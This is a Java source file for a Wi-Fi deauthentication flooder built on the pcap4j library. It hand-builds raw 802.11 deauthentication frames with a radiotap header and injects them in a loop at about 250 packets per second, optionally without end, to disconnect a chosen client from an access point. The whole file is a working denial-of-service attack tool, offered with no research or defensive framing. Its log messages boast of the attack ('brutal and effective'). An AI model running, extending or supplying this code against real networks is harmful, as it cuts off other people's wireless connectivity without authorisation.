/**
*=========================================Author==================================
				     Ishmael D. Tembo
==================================================================================
**/


import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.RadiotapPacket;
import org.pcap4j.util.MacAddress;

import java.util.concurrent.*;

public class Deauther {

    private final PcapHandle handle;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private volatile boolean running = false;

    public Deauther(PcapNetworkInterface nif) throws PcapNativeException {
        this.handle = nif.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
        System.out.println("[DEAUTH ENGINE] ARMED on " + nif.getName() + " (real radiotap injection)");
    }

    public void deauth(String clientMac, String apMac, int count) {
        if (running) {
            System.out.println("[DEAUTH] Stopping previous attack...");
            stop();
        }
        running = true;
        executor.submit(() -> flood(clientMac, apMac, count));
    }

    private void flood(String client, String ap, int total) {
        byte[] c = MacAddress.getByName(client).getAddress();
        byte[] a = MacAddress.getByName(ap).getAddress();

        // Raw 802.11 Deauthentication frame
        byte[] deauthFrame = {
            (byte)0xC0, 0x00,                               // Type/Subtype: Deauth
            0x00, 0x00,                                     // Duration
            c[0], c[1], c[2], c[3], c[4], c[5],             // Receiver (Client)
            a[0], a[1], a[2], a[3], a[4], a[5],             // Transmitter (AP)
            a[0], a[1], a[2], a[3], a[4], a[5],             // BSSID
            0x00, 0x00,                                     // Fragment & Sequence
            0x07, 0x00                                      // Reason: Class 3 frame from non-associated STA
        };

        // === BUILD REAL RADIOTAP HEADER ===
        RadiotapPacket.Builder radiotapBuilder = new RadiotapPacket.Builder();
        
        // Minimal valid radiotap (8 bytes header + 4 bytes present flags + 1 byte antenna signal)
        byte[] radiotapData = new byte[] {
            0x00, 0x00,             // Radiotap version + pad
            0x0d, 0x00,             // Length = 13 bytes
            0x04, 0x00, 0x00, 0x00, // Present flags: only antenna signal
            0x00,                   // Flags
            (byte)0x02,             // Data rate (doesn't matter)
            0x00, 0x00,             // Channel freq/pad
            (byte)0x9c              // Antenna signal: -100 dBm (example)
        };

        // Attach 802.11 frame as payload
        byte[] finalBytes = new byte[radiotapData.length + deauthFrame.length];
	System.arraycopy(radiotapData, 0, finalBytes, 0, radiotapData.length);
	System.arraycopy(deauthFrame, 0, finalBytes, radiotapData.length, deauthFrame.length);

	Packet packet = UnknownPacket.newPacket(finalBytes, 0, finalBytes.length);

        System.out.printf("[DEAUTH FLOOD] %s kicked from %s | Packets: %s%n", 
            client, ap, total == 0 ? "INFINITE" : total);

        int sent = 0;
        while (running && (total == 0 || sent < total)) {
            try {
                handle.sendPacket(packet);
                sent++;
                if (sent % 100 == 0) {
                    System.out.printf("[SENT] %,d deauth frames -> %s%n", sent, client);
                }
                Thread.sleep(4); // ~250 pps — brutal and effective
            } catch (Exception e) {
                System.out.println("[INJECTION] Failed (normal on non-monitor adapters): " + e.getMessage());
                break;
            }
        }
        System.out.println("[DEAUTH] Attack stopped.");
    }

    public void stop() {
        running = false;
    }

    public void close() {
        stop();
        if (handle != null && handle.isOpen()) handle.close();
        executor.shutdownNow();
    }
}